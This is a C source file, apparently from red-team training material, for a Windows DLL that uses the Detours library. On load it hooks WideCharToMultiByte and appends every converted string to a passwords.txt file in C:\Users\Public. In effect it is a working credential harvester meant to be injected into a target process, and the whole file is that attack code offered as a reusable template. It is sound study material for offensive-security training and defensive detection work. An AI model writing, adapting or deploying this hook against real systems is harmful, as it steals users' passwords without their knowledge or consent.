/*
 
 Red Team Operator code template
 Hooking DLL using Detours

 author: reenz0h (twitter: @SEKTOR7net)
 
*/

#include <stdio.h>
#include <windows.h>
#include "detours.h"
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")


// pointer to original WideCharToMultiByte
int (WINAPI * pWideCharToMultiByte)(
	UINT                               CodePage,
	DWORD                              dwFlags,
	_In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
	int                                cchWideChar,
	LPSTR                              lpMultiByteStr,
	int                                cbMultiByte,
	LPCCH                              lpDefaultChar,
	LPBOOL                             lpUsedDefaultChar
  ) = WideCharToMultiByte;

BOOL Hookem(void);
BOOL UnHookem(void);

// Hooking function
int WINAPI HookedWideCharToMultiByte(UINT CodePage, DWORD dwFlags, _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar) {
	int ret;
	char buffer[200];


	// call original function
	ret = pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
	sprintf(buffer, "DATA = %s\n", lpMultiByteStr);
	// OutputDebugStringA(buffer);

	// store password in file, create file if it does not exist, append file, use handle to file and WriteFile()
	HANDLE hFile = CreateFileA(
		"C:\\Users\\Public\\passwords.txt",
		FILE_APPEND_DATA,
		FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hFile != INVALID_HANDLE_VALUE) {
		DWORD bytesWritten;
		int len = lstrlenA(lpMultiByteStr);
		WriteFile(hFile, lpMultiByteStr, len, &bytesWritten, NULL);
		WriteFile(hFile, "\r\n", 2, &bytesWritten, NULL); // Windows line ending
		CloseHandle(hFile);
	}

	return ret;
}

// Set hooks on WideCharToMultiByte
BOOL Hookem(void) {

    LONG err;

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach((PVOID*)&pWideCharToMultiByte, HookedWideCharToMultiByte);

	err = DetourTransactionCommit();

	// char hookMsg[256];
	// sprintf(hookMsg, "WideCharToMultiByte() hooked! (res = %d)\n", err);
	// OutputDebugStringA(hookMsg);
	
	return TRUE;
}

// Revert all changes to original code
BOOL UnHookem(void) {
	
	LONG err;
	
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach((PVOID*)&pWideCharToMultiByte, HookedWideCharToMultiByte);
	err = DetourTransactionCommit();

	// char unhookMsg[256];
	// sprintf(unhookMsg, "Hook removed from WideCharToMultiByte() (res = %d)\n", err);
	// OutputDebugStringA(unhookMsg);
	
	return TRUE;
}

__declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {
// BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {
    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			Hookem();
			break;
			
		case DLL_THREAD_ATTACH:
			break;
			
		case DLL_THREAD_DETACH:
			break;
			
		case DLL_PROCESS_DETACH:
			UnHookem();
			break;
	}
	
    return TRUE;
}

